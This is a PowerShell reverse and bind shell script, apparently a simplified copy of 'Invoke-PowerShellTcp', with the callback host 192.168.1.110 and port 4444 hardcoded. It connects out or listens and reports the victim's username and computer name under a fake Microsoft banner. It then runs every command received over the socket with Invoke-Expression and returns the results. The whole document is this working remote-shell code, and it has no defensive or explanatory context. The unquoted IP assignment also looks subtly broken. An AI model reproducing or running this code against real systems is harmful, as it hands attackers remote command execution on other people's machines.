# Begin: Invoke-PowerShellTcp

# Parameters would be defined here in original script
# Using variables to simulate parameters
$IPAddress = 192.168.1.110  # Simulating parameter input
$Port = 4444       # Simulating parameter input
$Reverse = $true       # Default to reverse if not specified
$Bind = $false         # Default to not bind if not specified

# Main try block begins
$ErrorActionPreference = "Stop"

# Connect back if the reverse switch is used
$reverseCondition = $Reverse -and (-not $Bind)
if ($reverseCondition) {
    $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
}

# Bind to the provided port if Bind switch is used
$bindCondition = $Bind -and (-not $Reverse)
if ($bindCondition) {
    $listener = [System.Net.Sockets.TcpListener]$Port
    $listener.start()    
    $client = $listener.AcceptTcpClient()
}
 
# Set up stream and buffer
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

# Send back current username and computername
$sendText = "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n"
$sendbytes = ([text.encoding]::ASCII).GetBytes($sendText)
$stream.Write($sendbytes,0,$sendbytes.Length)

# Show an interactive PowerShell prompt
$promptText = 'PS ' + (Get-Location).Path + '>'
$sendbytes = ([text.encoding]::ASCII).GetBytes($promptText)
$stream.Write($sendbytes,0,$sendbytes.Length)

# Main communication loop
$loopCondition = $true
while ($loopCondition) {
    $i = $stream.Read($bytes, 0, $bytes.Length)
    $loopCondition = $i -ne 0
    
    if (-not $loopCondition) { break }
    
    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
    $data = $EncodedText.GetString($bytes,0, $i)
    
    # Command execution try block
    $commandError = $null
    try {
        $sendback = Invoke-Expression -Command $data 2>&1 | Out-String
    }
    catch {
        $commandError = $_
        Write-Warning "Something went wrong with execution of command on the target."
        Write-Error $commandError
    }
    
    # Prepare response
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    $x = ($error[0] | Out-String)
    $error.clear()
    $sendback2 = $sendback2 + $x
    
    # Return the results
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}

# Cleanup
$client.Close()

if ($bindCondition -and $listener) {
    $listener.Stop()
}

# End: Invoke-PowerShellTcp